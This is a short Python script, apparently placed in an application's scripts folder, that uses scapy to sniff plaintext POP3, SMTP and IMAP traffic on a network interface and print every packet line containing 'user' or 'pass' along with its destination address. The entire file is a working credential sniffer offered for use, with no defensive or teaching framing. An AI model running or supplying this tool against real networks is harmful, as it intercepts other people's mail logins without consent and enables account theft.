#!/usr/bin/env python3
"""Print credential-bearing lines from plaintext POP3/SMTP/IMAP traffic.

Usage:  python3 /app/scripts/mail.py eth0
        python3 /app/scripts/mail.py eth0 100
"""
import sys
from scapy.all import IP, TCP, Raw, sniff

iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
count = int(sys.argv[2]) if len(sys.argv) > 2 else 0  # 0 = forever

BPF = "tcp port 110 or tcp port 25 or tcp port 143"


def show(p):
    payload = bytes(p[TCP].payload).decode("utf-8", "replace")
    if "user" in payload.lower() or "pass" in payload.lower():
        print(p[IP].dst, payload.strip())


sniff(iface=iface, filter=BPF,
      lfilter=lambda p: p.haslayer(TCP) and p.haslayer(Raw),
      prn=show, store=False, count=count)
